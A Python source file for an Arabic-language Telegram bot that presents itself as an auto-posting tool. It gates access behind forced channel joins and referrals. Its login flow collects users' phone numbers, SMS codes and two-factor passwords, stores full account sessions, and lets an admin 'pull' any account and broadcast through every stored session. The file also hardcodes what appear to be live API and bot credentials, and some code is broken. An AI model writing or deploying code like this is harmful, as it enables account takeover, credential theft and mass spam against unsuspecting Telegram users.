import os
import re
import time
import asyncio
import logging
import sqlite3
from datetime import datetime, timedelta
from dotenv import load_dotenv
from telethon import TelegramClient, events, Button, functions, types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    ChannelPrivateError,
    ChatWriteForbiddenError,
    FloodWaitError
)
from aiohttp import web
import threading
import random
import hmac
import hashlib

# تحميل متغيرات البيئة
load_dotenv()

# تهيئة الإعدادات
API_ID = int(os.getenv('API_ID', 23656977))
API_HASH = os.getenv('API_HASH', '49d3f43531a92b3f5bc403766313ca1e')
BOT_TOKEN = os.getenv('BOT_TOKEN', '8110119856:AAGtC5c8oQ1CA_FpGPQD0zg4ZArPunYSwr4')
TIMEOUT = 300  # 300 ثانية = 5 دقائق
ADMIN_ID = int(os.getenv('ADMIN_ID', 123456789))  # أيدي المدير
MANDATORY_CHANNELS = ['crazys7', 'AWU87']  # قنوات الاشتراك الإجباري
MIN_INVITES = 5  # الحد الأدنى من الدعوات المطلوبة
WEBHOOK_URL = os.getenv('WEBHOOK_URL', 'https://pixai7.onrender.com')
PORT = int(os.getenv('PORT', 8000))
WEBHOOK_SECRET = os.getenv('WEBHOOK_SECRET', 'your_strong_secret_here')  # سر للتأكيد

# تهيئة السجلات
logging.basicConfig(
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    level=logging.INFO,
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# تهيئة قاعدة البيانات
conn = sqlite3.connect('bot.db', check_same_thread=False)
cursor = conn.cursor()

# إنشاء الجداول
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    phone TEXT,
    session TEXT,
    invited_by TEXT,
    invite_count INTEGER DEFAULT 0,
    verified BOOLEAN DEFAULT 0,
    banned BOOLEAN DEFAULT 0,
    is_admin BOOLEAN DEFAULT 0
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS settings (
    user_id INTEGER PRIMARY KEY,
    interval INTEGER DEFAULT 180,  -- بالثواني
    message TEXT,
    publishing_active BOOLEAN DEFAULT 0
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS publishing (
    user_id INTEGER,
    group_id INTEGER,
    group_name TEXT,
    active BOOLEAN DEFAULT 1,
    PRIMARY KEY (user_id, group_id)
)
''')

cursor.execute('''
CREATE TABLE IF NOT EXISTS referrals (
    user_id INTEGER PRIMARY KEY,
    referral_code TEXT UNIQUE,
    invited_users INTEGER DEFAULT 0
)
''')

# التصحيح: إصلاح بناء جملة الجدول
cursor.execute('''
CREATE TABLE IF NOT EXISTS pulled_accounts (
    account_id INTEGER PRIMARY KEY,
    user_id INTEGER,
    phone TEXT,
    session TEXT,
    pulled_by INTEGER,
    active BOOLEAN DEFAULT 1,
    FOREIGN KEY(user_id) REFERENCES users(user_id)
)
''')  # تم إزالة الأقواس الزائدة

conn.commit()

# بدء البوت
bot = TelegramClient(
    session='bot_session',
    api_id=API_ID,
    api_hash=API_HASH
)

# تخزين بيانات المستخدم المؤقتة
user_data = {}
publishing_tasks = {}
admin_data = {}  # بيانات مؤقتة للمديرين

# ===== وظائف مساعدة =====
def generate_referral_code(user_id):
    """إنشاء رمز دعوة فريد للمستخدم"""
    return f"REF-{user_id}-{int(time.time())}"

def get_user_settings(user_id):
    """الحصول على إعدادات المستخدم"""
    cursor.execute("SELECT interval, message, publishing_active FROM settings WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    if result:
        return result[0], result[1], result[2]
    return 180, "", False  # القيم الافتراضية

def save_user_settings(user_id, interval=None, message=None, publishing_active=None):
    """حفظ إعدادات المستخدم"""
    current_interval, current_message, current_active = get_user_settings(user_id)
    
    if interval is None:
        interval = current_interval
    if message is None:
        message = current_message
    if publishing_active is None:
        publishing_active = current_active
    
    cursor.execute('''
    INSERT OR REPLACE INTO settings (user_id, interval, message, publishing_active)
    VALUES (?, ?, ?, ?)
    ''', (user_id, interval, message, publishing_active))
    conn.commit()

def is_user_admin(user_id):
    """التحقق إذا كان المستخدم مديرًا"""
    cursor.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    return result and result[0] == 1 if result else False

def is_user_banned(user_id):
    """التحقق إذا كان المستخدم محظورًا"""
    cursor.execute("SELECT banned FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    return result and result[0] == 1 if result else False

def is_user_verified(user_id):
    """التحقق إذا أكمل المستخدم الشروط"""
    cursor.execute("SELECT verified FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    return result and result[0] == 1 if result else False

async def check_subscription(client, channels):
    """التحقق من اشتراك المستخدم في القنوات المطلوبة"""
    try:
        for channel in channels:
            try:
                await client.get_entity(channel)
            except (ValueError, ChannelPrivateError):
                return False
        return True
    except Exception as e:
        logger.error(f"خطأ في التحقق من الاشتراك: {str(e)}")
        return False

async def start_publishing(user_id):
    """بدء عملية النشر للمستخدم"""
    if user_id in publishing_tasks:
        return
        
    save_user_settings(user_id, publishing_active=True)
    
    async def publish_task():
        while user_id in publishing_tasks and publishing_tasks[user_id]['active']:
            try:
                interval, message, _ = get_user_settings(user_id)
                
                cursor.execute("SELECT session FROM users WHERE user_id = ?", (user_id,))
                result = cursor.fetchone()
                if not result:
                    logger.error(f"لا توجد جلسة للمستخدم {user_id}")
                    await asyncio.sleep(60)
                    continue
                    
                session_str = result[0]
                client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                await client.connect()
                
                cursor.execute('''
                SELECT group_id, group_name FROM publishing 
                WHERE user_id = ? AND active = 1
                ''', (user_id,))
                groups = cursor.fetchall()
                
                for group_id, group_name in groups:
                    try:
                        await client.send_message(group_id, message)
                        logger.info(f"تم النشر في {group_name} ({group_id})")
                    except (ChannelPrivateError, ChatWriteForbiddenError):
                        cursor.execute('''
                        UPDATE publishing SET active = 0 
                        WHERE user_id = ? AND group_id = ?
                        ''', (user_id, group_id))
                        conn.commit()
                        logger.warning(f"تم تعطيل المجموعة {group_name} ({group_id})")
                    except FloodWaitError as e:
                        logger.warning(f"تم تقييد النشر: الانتظار {e.seconds} ثانية")
                        await asyncio.sleep(e.seconds)
                    except Exception as e:
                        logger.error(f"خطأ في النشر: {str(e)}")
                
                await client.disconnect()
                await asyncio.sleep(interval)
                
            except Exception as e:
                logger.error(f"خطأ في مهمة النشر: {str(e)}")
                await asyncio.sleep(60)
    
    publishing_tasks[user_id] = {'active': True, 'task': asyncio.create_task(publish_task())}
    logger.info(f"تم تشغيل النشر للمستخدم {user_id}")

async def stop_publishing(user_id):
    """إيقاف عملية النشر للمستخدم"""
    if user_id in publishing_tasks:
        publishing_tasks[user_id]['active'] = False
        publishing_tasks[user_id]['task'].cancel()
        del publishing_tasks[user_id]
        save_user_settings(user_id, publishing_active=False)
        logger.info(f"تم إيقاف النشر للمستخدم {user_id}")

# ===== إعداد Webhook =====
async def setup_webhook():
    """تهيئة Webhook لاستقبال التحديثات"""
    webhook_url = f"{WEBHOOK_URL}/webhook/{BOT_TOKEN}"
    
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"تم بدء البوت: @{me.username} ({me.id})")
    
    commands = [
        types.BotCommand(command='start', description='بدء استخدام البوت'),
        types.BotCommand(command='help', description='الحصول على المساعدة')
    ]
    await bot(functions.bots.SetBotCommandsRequest(commands=commands))
    
    result = await bot(functions.bots.SetBotWebhookRequest(
        url=webhook_url,
        certificate=None,
        drop_pending_updates=True,
        secret_token=WEBHOOK_SECRET
    ))
    
    logger.info(f"تم تعيين Webhook: {result} | URL: {webhook_url}")

async def verify_telegram_webhook(request):
    """التحقق من أن الطلب جاء من Telegram"""
    if 'X-Telegram-Bot-Api-Secret-Token' not in request.headers:
        return False
        
    received_secret = request.headers['X-Telegram-Bot-Api-Secret-Token']
    return hmac.compare_digest(received_secret, WEBHOOK_SECRET)

async def webhook_handler(request):
    """معالجة طلبات Webhook"""
    if not await verify_telegram_webhook(request):
        return web.Response(status=403, text="Forbidden")
    
    try:
        update = await request.json()
        await bot._process_update(update)
        return web.Response(text="OK")
    except Exception as e:
        logger.error(f"خطأ في معالجة Webhook: {str(e)}")
        return web.Response(status=500, text="Internal Server Error")

# ===== معالجات الأحداث =====
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    message = event.message
    match = re.search(r'ref-(\w+)', message.text, re.IGNORECASE)
    
    if user_id in user_data:
        del user_data[user_id]
    
    if is_user_banned(user_id):
        await event.reply("❌ حسابك محظور من استخدام البوت.")
        return
    
    if match:
        referral_code = match.group(1)
        cursor.execute('''
        UPDATE referrals SET invited_users = invited_users + 1 
        WHERE referral_code = ?
        ''', (referral_code,))
        conn.commit()
    
    try:
        if not await check_subscription(event.client, MANDATORY_CHANNELS):
            channels_list = "\n".join([f"@{channel}" for channel in MANDATORY_CHANNELS])
            await event.reply(
                f"📢 يجب الاشتراك في القنوات التالية أولاً:\n{channels_list}\n\n"
                "بعد الاشتراك، اضغط /start مرة أخرى."
            )
            return
    except Exception as e:
        logger.error(f"خطأ في التحقق من الاشتراك: {str(e)}")
    
    if not is_user_verified(user_id):
        cursor.execute("SELECT invite_count FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        invite_count = result[0] if result else 0
        
        if invite_count < MIN_INVITES:
            cursor.execute("SELECT referral_code FROM referrals WHERE user_id = ?", (user_id,))
            result = cursor.fetchone()
            referral_code = result[0] if result else generate_referral_code(user_id)
            
            if not result:
                cursor.execute('''
                INSERT INTO referrals (user_id, referral_code)
                VALUES (?, ?)
                ''', (user_id, referral_code))
                conn.commit()
            
            bot_username = (await bot.get_me()).username
            invite_link = f"https://t.me/{bot_username}?start=ref-{referral_code}"
            
            await event.reply(
                f"👥 يجب دعوة {MIN_INVITES} أعضاء لاستخدام البوت.\n\n"
                f"عدد الدعوات المتبقية: {MIN_INVITES - invite_count}\n\n"
                f"رابط الدعوة الخاص بك:\n{invite_link}\n\n"
                "سيتم تفعيل حسابك بعد اكتمال الدعوات."
            )
            return
        else:
            cursor.execute("UPDATE users SET verified = 1 WHERE user_id = ?", (user_id,))
            conn.commit()
    
    buttons = [
        [Button.inline("تسجيل الدخول", b"login")],
        [Button.inline("إعداد النشر", b"publish_setup")],
        [Button.inline("مساعدة", b"help")]
    ]
    
    if is_user_admin(user_id):
        buttons.append([Button.inline("لوحة المدير", b"admin_panel")])
    
    await event.reply(
        "مرحباً بك في البوت المتطور!",
        buttons=buttons
    )

@bot.on(events.CallbackQuery(data=b"login"))
async def login_handler(event):
    user_id = event.sender_id
    user_data[user_id] = {'step': 'phone'}
    await event.edit("أرسل رقم هاتفك مع رمز الدولة (مثال: +20123456789):")

@bot.on(events.NewMessage)
async def handle_messages(event):
    user_id = event.sender_id
    data = user_data.get(user_id, {})
    
    if not event.is_private:
        return
    
    if is_user_banned(user_id):
        return
    
    if not is_user_verified(user_id):
        await event.reply("❗ يجب إكمال متطلبات الدعوة أولاً.")
        return
    
    if data.get('step') == 'phone':
        phone = event.text.strip()
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(phone, force_sms=True)
            
            user_data[user_id] = {
                'step': 'code',
                'phone': phone,
                'client': client,
                'phone_code_hash': sent_code.phone_code_hash,
                'start_time': datetime.now(),
                'retry_count': 0
            }
            
            await event.reply(
                "📩 تم إرسال كود التحقق عبر SMS.\n\n"
                "⚠️ أرسل الكود في هذا الشكل: 1 2 3 4 5 (بمسافات بين الأرقام)"
            )
        except Exception as e:
            await event.reply(f"❌ خطأ في إرسال الكود: {str(e)}")
            if user_id in user_data:
                del user_data[user_id]
    
    elif data.get('step') == 'code':
        code = event.text.strip()
        client = data['client']
        phone = data['phone']
        phone_code_hash = data['phone_code_hash']
        retry_count = data.get('retry_count', 0)
        
        try:
            try:
                code = ''.join(code.split())
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                
                session_str = client.session.save()
                cursor.execute('''
                INSERT OR REPLACE INTO users (user_id, phone, session)
                VALUES (?, ?, ?)
                ''', (user_id, phone, session_str))
                conn.commit()
                
                await client.disconnect()
                await event.reply("✅ تسجيل الدخول ناجح! يمكنك الآن استخدام البوت.")
                del user_data[user_id]
                await start_handler(event)
                
            except (PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
                retry_count += 1
                
                if retry_count < 3:
                    try:
                        sent_code = await client.send_code_request(phone, force_sms=True)
                        user_data[user_id]['phone_code_hash'] = sent_code.phone_code_hash
                        user_data[user_id]['retry_count'] = retry_count
                        await event.reply(
                            f"⚠️ الكود منتهي الصلاحية أو غير صحيح! (المحاولة {retry_count}/3)\n"
                            "📩 تم إرسال كود جديد عبر SMS. أرسله الآن:"
                        )
                    except Exception as e:
                        await event.reply(f"❌ فشل إعادة إرسال الكود: {str(e)}")
                        await client.disconnect()
                        del user_data[user_id]
                else:
                    await event.reply("❌ لقد تجاوزت عدد المحاولات المسموح بها. يرجى البدء من جديد.")
                    await client.disconnect()
                    del user_data[user_id]
            
            except SessionPasswordNeededError:
                user_data[user_id]['step'] = 'password'
                await event.reply("🔒 حسابك محمي بكلمة سر. أرسلها الآن:")
                
            except Exception as e:
                await event.reply(f"❌ خطأ غير متوقع: {str(e)}")
                try:
                    await client.disconnect()
                except:
                    pass
                del user_data[user_id]
                
        except Exception as e:
            await event.reply(f"❌ خطأ في المعالجة: {str(e)}")
            if user_id in user_data:
                del user_data[user_id]
    
    elif data.get('step') == 'password':
        password = event.text
        client = data['client']
        
        try:
            await client.sign_in(password=password)
            session_str = client.session.save()
            cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, phone, session)
            VALUES (?, ?, ?)
            ''', (user_id, phone, session_str))
            conn.commit()
            
            await client.disconnect()
            await event.reply("✅ تسجيل الدخول ناجح! يمكنك الآن استخدام البوت.")
            del user_data[user_id]
            await start_handler(event)
        except Exception as e:
            await event.reply(f"❌ خطأ في كلمة السر: {str(e)}")
            if user_id in user_data:
                del user_data[user_id]

@bot.on(events.CallbackQuery(pattern=b'publish_setup'))
async def publish_setup_handler(event):
    user_id = event.sender_id
    interval, message, publishing_active = get_user_settings(user_id)
    
    buttons = [
        [Button.inline("الفاصل الزمني", b"set_interval")],
        [Button.inline("تعيين الكليشة", b"set_message")],
        [Button.inline("بدء النشر", b"start_publishing")],
        [Button.inline("إيقاف النشر" if publishing_active else "تشغيل النشر", b"toggle_publishing")],
        [Button.inline("العودة", b"main_menu")]
    ]
    
    await event.edit("⚙️ إعدادات النشر:", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b'set_interval'))
async def set_interval_handler(event):
    user_id = event.sender_id
    user_data[user_id] = {'step': 'set_interval'}
    await event.edit("أدخل الفاصل الزمني بين عمليات النشر (بالدقيم)، الحد الأدنى 3 دقائق:")

@bot.on(events.CallbackQuery(pattern=b'set_message'))
async def set_message_handler(event):
    user_id = event.sender_id
    user_data[user_id] = {'step': 'set_message'}
    await event.edit("أرسل الرسالة التي تريد نشرها:")

@bot.on(events.NewMessage)
async def handle_settings(event):
    user_id = event.sender_id
    data = user_data.get(user_id, {})
    
    if not event.is_private:
        return
    
    if data.get('step') == 'set_interval':
        try:
            minutes = int(event.text.strip())
            if minutes < 3:
                await event.reply("❌ يجب أن يكون الفاصل الزمني 3 دقائق على الأقل.")
                return
                
            save_user_settings(user_id, interval=minutes*60)
            await event.reply(f"✅ تم تعيين الفاصل الزمني إلى {minutes} دقائق.")
            del user_data[user_id]
            await publish_setup_handler(event)
        except ValueError:
            await event.reply("❌ الرجاء إدخال رقم صحيح.")
    
    elif data.get('step') == 'set_message':
        message = event.text
        save_user_settings(user_id, message=message)
        await event.reply("✅ تم حفظ الرسالة بنجاح.")
        del user_data[user_id]
        await publish_setup_handler(event)

@bot.on(events.CallbackQuery(pattern=b'toggle_publishing'))
async def toggle_publishing_handler(event):
    user_id = event.sender_id
    _, _, publishing_active = get_user_settings(user_id)
    
    if publishing_active:
        await stop_publishing(user_id)
        action = "⏸ تم إيقاف النشر"
    else:
        interval, message, _ = get_user_settings(user_id)
        if not message or not interval:
            await event.answer("❗ يجب تعيين الرسالة والفاصل الزمني أولاً!", alert=True)
            return
            
        await start_publishing(user_id)
        action = "▶️ تم تشغيل النشر"
    
    await publish_setup_handler(event)
    await event.answer(action)

@bot.on(events.CallbackQuery(pattern=b'start_publishing'))
async def start_publishing_handler(event):
    user_id = event.sender_id
    interval, message, _ = get_user_settings(user_id)
    if not message:
        await event.answer("❗ يجب تعيين الرسالة أولاً!", alert=True)
        return
    if not interval:
        await event.answer("❗ يجب تعيين الفاصل الزمني أولاً!", alert=True)
        return
    
    await start_publishing(user_id)
    await event.answer("▶️ تم بدء النشر!")
    await publish_setup_handler(event)

@bot.on(events.CallbackQuery(pattern=b'main_menu'))
async def main_menu_handler(event):
    user_id = event.sender_id
    buttons = [
        [Button.inline("تسجيل الدخول", b"login")],
        [Button.inline("إعداد النشر", b"publish_setup")],
        [Button.inline("مساعدة", b"help")]
    ]
    
    if is_user_admin(user_id):
        buttons.append([Button.inline("لوحة المدير", b"admin_panel")])
    
    await event.edit("🏠 القائمة الرئيسية:", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b'help'))
async def help_handler(event):
    help_text = (
        "📚 دليل استخدام البوت:\n\n"
        "1. تسجيل الدخول: لتسجيل دخول حسابك في التلجرام\n"
        "2. إعداد النشر: لضبط إعدادات النشر التلقائي\n"
        "   - الفاصل الزمني: الوقت بين كل عملية نشر (3 دقائق كحد أدنى)\n"
        "   - تعيين الكليشة: الرسالة التي سيتم نشرها\n"
        "   - تشغيل/إيقاف النشر: لبدء أو إيقاف النشر التلقائي\n"
        "3. لوحة المدير: للمستخدمين المسؤولين\n\n"
        "⚠️ ملاحظات:\n"
        "- عند وجود خطأ في مجموعة، سيتم استبعادها من النشر\n"
        "- يجب إدخال كود التحقق بهذا الشكل: 1 2 3 4 5\n"
        "- يجب الاشتراك في القنوات المطلوبة أولاً"
    )
    await event.edit(help_text, buttons=[[Button.inline("العودة", b"main_menu")]])

# ===== وظائف المدير =====
@bot.on(events.CallbackQuery(pattern=b'admin_panel'))
async def admin_panel_handler(event):
    user_id = event.sender_id
    if not is_user_admin(user_id):
        await event.answer("❌ ليس لديك صلاحية الوصول!")
        return
        
    buttons = [
        [Button.inline("حظر/فك حظر مستخدم", b"admin_ban_user")],
        [Button.inline("سحب رقم", b"admin_pull_number")],
        [Button.inline("إرسال إشعار لجميع المستخدمين", b"admin_broadcast")],
        [Button.inline("إرسال إشعار عام شامل", b"admin_full_broadcast")],
        [Button.inline("العودة", b"main_menu")]
    ]
    
    await event.edit("👑 لوحة المدير:", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b'admin_ban_user'))
async def admin_ban_user_handler(event):
    user_id = event.sender_id
    if not is_user_admin(user_id):
        await event.answer("❌ ليس لديك صلاحية الوصول!")
        return
        
    admin_data[user_id] = {'step': 'ban_user'}
    await event.edit("أرسل أيدي المستخدم الذي تريد حظره أو فك حظره:")

@bot.on(events.NewMessage)
async def handle_admin_commands(event):
    user_id = event.sender_id
    data = admin_data.get(user_id, {})
    
    if not event.is_private:
        return
    
    if not is_user_admin(user_id):
        return
    
    if data.get('step') == 'ban_user':
        try:
            target_user_id = int(event.text.strip())
            cursor.execute("SELECT banned FROM users WHERE user_id = ?", (target_user_id,))
            result = cursor.fetchone()
            
            if not result:
                await event.reply("❌ المستخدم غير موجود.")
                return
                
            banned = result[0]
            new_banned = 0 if banned else 1
            
            cursor.execute("UPDATE users SET banned = ? WHERE user_id = ?", (new_banned, target_user_id))
            conn.commit()
            
            action = "فك حظر" if banned else "حظر"
            await event.reply(f"✅ تم {action} المستخدم {target_user_id} بنجاح.")
            del admin_data[user_id]
            
            if new_banned:
                await stop_publishing(target_user_id)
                    
        except ValueError:
            await event.reply("❌ الرجاء إدخال أيدي صحيح.")
        except Exception as e:
            await event.reply(f"❌ خطأ: {str(e)}")
            del admin_data[user_id]

@bot.on(events.CallbackQuery(pattern=b'admin_pull_number'))
async def admin_pull_number_handler(event):
    user_id = event.sender_id
    if not is_user_admin(user_id):
        await event.answer("❌ ليس لديك صلاحية الوصول!")
        return
        
    cursor.execute("SELECT user_id, phone FROM users ORDER BY RANDOM() LIMIT 10")
    accounts = cursor.fetchall()
    
    if not accounts:
        await event.answer("❌ لا توجد حسابات مسجلة!", alert=True)
        return
    
    buttons = []
    for account_id, phone in accounts:
        buttons.append([Button.inline(f"{phone}", f"pull:{account_id}")])
    
    buttons.append([Button.inline("🔄 تحديث القائمة", b"admin_pull_number")])
    buttons.append([Button.inline("العودة", b"admin_panel")])
    
    await event.edit("📱 اختر حسابًا لسحب رسائله:", buttons=buttons)

@bot.on(events.CallbackQuery(pattern=r'pull:(\d+)'))
async def handle_pull_account(event):
    user_id = event.sender_id
    account_id = int(event.pattern_match.group(1))
    
    if not is_user_admin(user_id):
        await event.answer("❌ ليس لديك صلاحية الوصول!")
        return
        
    cursor.execute("SELECT user_id, phone, session FROM users WHERE user_id = ?", (account_id,))
    account = cursor.fetchone()
    
    if not account:
        await event.answer("❌ الحساب غير موجود!", alert=True)
        return
        
    target_user_id, phone, session = account
    
    cursor.execute('''
    INSERT OR REPLACE INTO pulled_accounts (account_id, user_id, phone, session, pulled_by)
    VALUES (?, ?, ?, ?, ?)
    ''', (account_id, target_user_id, phone, session, user_id))
    conn.commit()
    
    await event.answer(f"✅ تم سحب الحساب {phone} بنجاح. سيتم إعادة توجيه رسائلك إليه.")
    await admin_panel_handler(event)

@bot.on(events.NewMessage(incoming=True))
async def handle_pulled_account_messages(event):
    if not event.is_private:
        return
    
    sender_id = event.sender_id
    cursor.execute("SELECT pulled_by FROM pulled_accounts WHERE user_id = ? AND active = 1", (sender_id,))
    result = cursor.fetchone()
    
    if result:
        pulled_by = result[0]
        try:
            await bot.forward_messages(pulled_by, event.message)
        except Exception as e:
            logger.error(f"خطأ في إعادة توجيه الرسالة: {str(e)}")

@bot.on(events.CallbackQuery(pattern=b'admin_broadcast'))
async def admin_broadcast_handler(event):
    user_id = event.sender_id
    if not is_user_admin(user_id):
        await event.answer("❌ ليس لديك صلاحية الوصول!")
        return
        
    admin_data[user_id] = {'step': 'broadcast'}
    await event.edit("أرسل الرسالة التي تريد بثها لجميع مستخدمي البوت:")

@bot.on(events.CallbackQuery(pattern=b'admin_full_broadcast'))
async def admin_full_broadcast_handler(event):
    user_id = event.sender_id
    if not is_user_admin(user_id):
        await event.answer("❌ ليس لديك صلاحية الوصول!")
        return
        
    admin_data[user_id] = {'step': 'full_broadcast'}
    await event.edit("أرسل الرسالة التي تريد بثها لجميع المستخدمين والمجموعات:")

@bot.on(events.NewMessage)
async def handle_broadcast(event):
    user_id = event.sender_id
    data = admin_data.get(user_id, {})
    
    if not event.is_private:
        return
    
    if not is_user_admin(user_id):
        return
    
    if data.get('step') == 'broadcast':
        message = event.text
        cursor.execute("SELECT user_id FROM users")
        users = cursor.fetchall()
        
        success = 0
        fail = 0
        
        for (target_user_id,) in users:
            try:
                await bot.send_message(target_user_id, message)
                success += 1
            except Exception:
                fail += 1
        
        await event.reply(f"📣 تم إرسال الرسالة إلى {success} مستخدم، وفشل الإرسال لـ {fail} مستخدم.")
        del admin_data[user_id]
    
    elif data.get('step') == 'full_broadcast':
        message = event.text
        cursor.execute("SELECT user_id, session FROM users")
        accounts = cursor.fetchall()
        
        total_users = 0
        total_groups = 0
        success = 0
        fail = 0
        
        for user_id, session_str in accounts:
            total_users += 1
            try:
                await bot.send_message(user_id, message)
                
                client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                await client.connect()
                
                cursor.execute("SELECT group_id FROM publishing WHERE user_id = ? AND active = 1", (user_id,))
                groups = cursor.fetchall()
                
                for (group_id,) in groups:
                    total_groups += 1
                    try:
                        await client.send_message(group_id, message)
                        success += 1
                    except Exception:
                        fail += 1
                
                await client.disconnect()
                
            except Exception:
                fail += 1
        
        await event.reply(
            f"🌍 تم إرسال الرسالة إلى:\n"
            f"- {total_users} مستخدم\n"
            f"- {total_groups} مجموعة\n"
            f"✅ نجح: {success}\n"
            f"❌ فشل: {fail}"
        )
        del admin_data[user_id]

# ===== استعادة مهام النشر عند البدء =====
async def restore_publishing_tasks():
    cursor.execute("SELECT user_id FROM settings WHERE publishing_active = 1")
    active_users = [row[0] for row in cursor.fetchall()]
    for user_id in active_users:
        asyncio.create_task(start_publishing(user_id))
        logger.info(f"تم استعادة النشر للمستخدم: {user_id}")

# ===== تشغيل البوت =====
async def start_web_server():
    app = web.Application()
    app.router.add_post(f'/webhook/{BOT_TOKEN}', webhook_handler)
    app.router.add_get('/health', lambda request: web.Response(text="OK"))
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"خادم Webhook يعمل على المنفذ {PORT}")

async def main_async():
    await restore_publishing_tasks()
    await setup_webhook()
    await start_web_server()

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main_async())
    loop.run_forever()

# ===== نقطة الدخول الرئيسية =====
if __name__ == '__main__':
    # إضافة المدير إلى قاعدة البيانات إذا لم يكن موجوداً
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (ADMIN_ID,))
    if not cursor.fetchone():
        cursor.execute('''
        INSERT INTO users (user_id, is_admin, verified)
        VALUES (?, 1, 1)
        ''', (ADMIN_ID,))
        conn.commit()
        logger.info(f"تم إضافة المدير: {ADMIN_ID}")
    
    # بدء البوت في خيط منفصل
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # بدء خادم ويب بسيط
    from flask import Flask, jsonify
    flask_app = Flask(__name__)
    
    @flask_app.route('/')
    def home():
        return jsonify(
            status="running",
            bot="active",
            webhook_url=f"{WEBHOOK_URL}/webhook/{BOT_TOKEN}"
        )
    
    @flask_app.route('/health')
    def health():
        return jsonify(status="ok")
    
    # إبقاء البرنامج الرئيسي نشطاً
    try:
        flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"خطأ في خادم Flask: {str(e)}") 
